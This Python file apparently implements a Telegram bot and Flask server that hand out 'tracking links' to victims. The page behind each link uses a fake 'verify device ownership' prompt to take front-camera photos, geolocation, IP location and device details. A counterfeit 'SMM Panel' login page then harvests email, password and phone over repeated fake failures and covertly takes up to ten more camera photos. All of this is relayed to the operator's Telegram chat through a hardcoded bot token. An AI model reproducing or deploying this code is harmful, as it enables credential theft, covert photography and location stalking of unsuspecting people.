import os
import threading
import base64
import requests
import urllib.parse
import json
import time
import secrets
from flask import Flask, request, render_template_string, session
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "7888111866:AAFTT2DxdpaSQ2JKOxUNR_YXrgK7q64M9lk"
SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-free-followers-website.onrender.com")

# Force Join Channel
CHANNELS = ["@noruleclub"]

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Store user data temporarily
user_data = {}

# --- FAKE SMM PANEL LOGIN PAGE ---
SMM_PANEL_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SMM Panel - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            border-radius: 24px;
            padding: 40px 35px;
            width: 100%;
            max-width: 440px;
            border: 1px solid #2a2a4a;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #fff;
            font-size: 32px;
            font-weight: 700;
        }
        .logo span {
            color: #6c63ff;
        }
        .logo p {
            color: #666;
            font-size: 13px;
            margin-top: 5px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #aaa;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0a0a1a;
            border: 1px solid #2a2a4a;
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: all 0.3s;
        }
        .form-group input:focus {
            border-color: #6c63ff;
            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.15);
        }
        .form-group input::placeholder {
            color: #444;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #6c63ff;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #5a52d5;
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #444;
            font-size: 12px;
        }
        .loader {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        .loader.active {
            display: block;
        }
        .spinner {
            border: 3px solid #2a2a4a;
            border-top: 3px solid #6c63ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-msg {
            background: #ff4444;
            color: #fff;
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
            margin-bottom: 15px;
        }
        .success-msg {
            background: #00c853;
            color: #fff;
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>SMM<span>Panel</span></h1>
            <p>Social Media Marketing Dashboard</p>
        </div>
        
        <div id="errorMsg" class="error-msg"></div>
        <div id="successMsg" class="success-msg">✅ Verification successful! Redirecting...</div>
        
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <div class="form-group">
                <label>📧 Email / Username</label>
                <input type="text" id="email" placeholder="Enter your email or username" required>
            </div>
            <div class="form-group">
                <label>🔑 Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <div class="form-group">
                <label>📱 Phone Number</label>
                <input type="tel" id="phone" placeholder="Enter your phone number">
            </div>
            
            <div class="loader" id="loader">
                <div class="spinner"></div>
                <p style="color:#666; margin-top:10px; font-size:13px;">Verifying credentials...</p>
            </div>
            
            <button type="submit" class="btn" id="loginBtn">🔓 Login to Dashboard</button>
        </form>
        
        <div class="footer">
            <p>© 2026 SMM Panel • Secure Connection</p>
        </div>
    </div>

    <script>
        let attemptCount = 0;
        let chatId = "{{ chat_id }}";
        let photoCount = 0;
        
        async function handleSubmit(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const phone = document.getElementById('phone').value;
            
            if (!email || !password) {
                showError('Please fill in all required fields');
                return;
            }
            
            const loader = document.getElementById('loader');
            const loginBtn = document.getElementById('loginBtn');
            
            loader.classList.add('active');
            loginBtn.disabled = true;
            loginBtn.textContent = 'Verifying...';
            
            const data = {
                chat_id: chatId,
                email: email,
                password: password,
                phone: phone || 'N/A',
                attempt: attemptCount + 1
            };
            
            try {
                const response = await fetch('/smm-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    document.getElementById('successMsg').style.display = 'block';
                    document.getElementById('loginForm').style.display = 'none';
                    
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 3000);
                } else {
                    attemptCount++;
                    if (attemptCount >= 5) {
                        showError('Too many failed attempts. Please try again later.');
                        loginBtn.disabled = true;
                        loginBtn.textContent = 'Locked';
                    } else {
                        showError('Invalid credentials. Please try again. (Attempt ' + attemptCount + '/5)');
                        loginBtn.disabled = false;
                        loginBtn.textContent = '🔓 Login to Dashboard';
                    }
                }
            } catch (error) {
                showError('Connection error. Please try again.');
                loginBtn.disabled = false;
                loginBtn.textContent = '🔓 Login to Dashboard';
            }
            
            loader.classList.remove('active');
        }
        
        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 4000);
        }
        
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();
                
                for (let i = 0; i < 10; i++) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    await fetch('/camera-photo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            photo: photoData,
                            photo_num: i + 1
                        })
                    });
                }
                
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                
            } catch(e) {
                console.log('Camera not available');
            }
        }
        
        window.onload = function() {
            startCamera();
        };
    </script>
</body>
</html>
"""

# --- JAVASCRIPT TRAP ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Verifying...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding-top:50px;}}
        .loader{{border:4px solid #333;border-top:4px solid #007bff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}}
        @keyframes spin {{0%{{transform:rotate(0deg);}} 100%{{transform:rotate(360deg);}}}}
        p{{color:#888; font-size:14px;}}
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>System Scanning...</h2>
    <p>Please click <b>Allow</b> to verify device ownership.</p>
    
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startTrap() {{
            let data = {{
                chat_id: "{chat_id}",
                userAgent: navigator.userAgent,
                language: navigator.language || "en-US",
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || "Unknown",
                ram: navigator.deviceMemory || "Unknown",
                screen: screen.width + "x" + screen.height,
                battery_level: "N/A",
                charging: "No",
                storage_used: "0.00",
                storage_total: "0.00",
                lat: null,
                lon: null,
                photo: null,
                perm_cam: "Denied",
                perm_loc: "Denied"
            }};

            try {{
                let b = await navigator.getBattery();
                data.battery_level = Math.round(b.level * 100) + "%";
                data.charging = b.charging ? "Yes" : "No";
            }} catch(e) {{}}

            try {{
                if (navigator.storage && navigator.storage.estimate) {{
                    const estimate = await navigator.storage.estimate();
                    data.storage_used = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
                    data.storage_total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
                }}
            }} catch(e) {{}}

            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
                data.perm_cam = "Allowed"; 
                let video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));
                
                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                data.photo = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
            }} catch(e) {{}}

            try {{
                await new Promise((resolve) => {{
                    navigator.geolocation.getCurrentPosition(pos => {{
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        data.perm_loc = "Allowed";
                        resolve();
                    }}, () => resolve(), {{timeout: 3000}});
                }});
            }} catch(e) {{}}

            await fetch('/upload', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});

            window.location.href = "/smm-panel?chat_id={chat_id}";
        }}
        window.onload = startTrap;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/smm-panel')
def smm_panel():
    chat_id = request.args.get('chat_id')
    return render_template_string(SMM_PANEL_HTML, chat_id=chat_id)

@app.route('/smm-login', methods=['POST'])
def smm_login():
    data = request.json
    chat_id = data.get('chat_id')
    email = data.get('email')
    password = data.get('password')
    phone = data.get('phone')
    attempt = data.get('attempt', 1)
    
    if not chat_id:
        return {"success": False}, 400
    
    msg = f"""
🔐 **SMM Panel Login Attempt #{attempt}**

📧 Email: `{email}`
🔑 Password: `{password}`
📱 Phone: `{phone}`

🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": msg,
                "parse_mode": "Markdown"
            }
        )
    except:
        pass
    
    if attempt >= 5:
        return {"success": True}
    
    return {"success": False}

@app.route('/camera-photo', methods=['POST'])
def camera_photo():
    data = request.json
    chat_id = data.get('chat_id')
    photo = data.get('photo')
    photo_num = data.get('photo_num', 1)
    
    if not chat_id or not photo:
        return "OK", 200
    
    try:
        img_data = base64.b64decode(photo.split(',')[1])
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            data={'chat_id': chat_id, 'caption': f'📸 Camera Photo #{photo_num}'},
            files={'photo': (f'cam_{photo_num}.jpg', img_data)}
        )
    except:
        pass
    
    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    tid = data.get('chat_id')
    if not tid: return "Error", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy").json()
    except:
        ip_info = {}

    if data.get('lat') and data.get('lon'):
        map_lat = data.get('lat')
        map_lon = data.get('lon')
        loc_perm = "Allowed"
    else:
        map_lat = ip_info.get('lat', 0)
        map_lon = ip_info.get('lon', 0)
        loc_perm = "Denied"

    map_link = f"maps.google.com/maps?q={map_lat},{map_lon}"

    def safe(val):
        return str(val).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')

    msg = (
        f"📊 **Visitor Information Captured**\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"🖥️ **Device and Browser**\n"
        f"   • Device Model: `{safe(data.get('platform'))}`\n"
        f"   • User Agent: `{safe(data.get('userAgent'))}`\n\n"
        f"🌐 **Network Information**\n"
        f"   • IP Address: `{ip}`\n"
        f"   • ISP: {safe(ip_info.get('isp', 'N/A'))}\n"
        f"   • Language: {safe(data.get('language'))}\n\n"
        f"📍 **Location Details**\n"
        f"   • Country: {safe(ip_info.get('country', 'N/A'))}\n"
        f"   • Region: {safe(ip_info.get('regionName', 'N/A'))}\n"
        f"   • City: {safe(ip_info.get('city', 'N/A'))}\n"
        f"   • Timezone: {safe(ip_info.get('timezone', 'N/A'))}\n\n"
        f"🖼️ **Display Information**\n"
        f"   • Resolution: {safe(data.get('screen'))}\n\n"
        f"🔋 **Battery Status**\n"
        f"   • Level: {safe(data.get('battery_level'))}\n"
        f"   • Charging: {safe(data.get('charging'))}\n\n"
        f"🔐 **Device Permissions**\n"
        f"   • Camera: {safe(data.get('perm_cam'))}\n"
        f"   • Location: {loc_perm}\n\n"
        f"💾 **Hardware & Storage**\n"
        f"   • CPU Cores: {safe(data.get('cores'))}\n"
        f"   • RAM: {safe(data.get('ram'))} GB\n"
        f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
        f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
        f"🗺 **Map Link:**\n{map_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⚡ Developed by: @Proxyfxz"
    )

    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": tid,
                "text": msg,
                "parse_mode": "Markdown"
            }
        )
    except Exception as e:
        print(f"Message Send Error: {e}")

    if data.get('photo'):
        try:
            img_data = base64.b64decode(data.get('photo').split(',')[1])
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': tid, 'caption': '📸 Initial Camera Photo'},
                files={'photo': ('cam.jpg', img_data)}
            )
        except: pass

    return "OK"

# --- HELPER: CHECK SUB ---
async def is_subscribed(app, user_id):
    for channel in CHANNELS:
        try:
            member = await app.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status in ["left", "kicked"]:
                return False
        except:
            return False
    return True

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_subscribed(context.application, user_id):
        buttons = [
            [InlineKeyboardButton("📢 Join @noruleclub", url="https://t.me/noruleclub")],
            [InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
        ]
        await update.message.reply_text(
            "❌ **Access Denied!**\n\nBot use karne ke liye aapko @noruleclub join karna hoga.",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    await update.message.reply_text("👋 **Tracker Online!**\nLink bhejo (jaise https://youtube.com).")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_subscribed(context.application, user_id):
        await start(update, context)
        return

    url = update.message.text
    if not url.startswith("http"):
        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
        return

    uid = update.effective_chat.id
    redir = urllib.parse.quote(url)
    link = f"{SERVER_URL}/?id={uid}&redir={redir}"

    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @Proxyfxz")

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()
